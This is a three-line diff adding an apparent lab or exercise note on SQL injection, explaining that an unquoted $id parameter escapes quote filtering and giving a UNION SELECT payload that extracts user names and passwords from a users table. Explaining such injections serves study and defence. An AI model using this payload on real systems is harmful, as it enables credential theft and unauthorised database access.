@@ -1,0 +1,3 @@
+Key here is to note that there is no quotes enclosing the $id, so as long as you don't send any quotes, they will not be escaped.
+
+1 UNION SELECT user, password FROM users; #
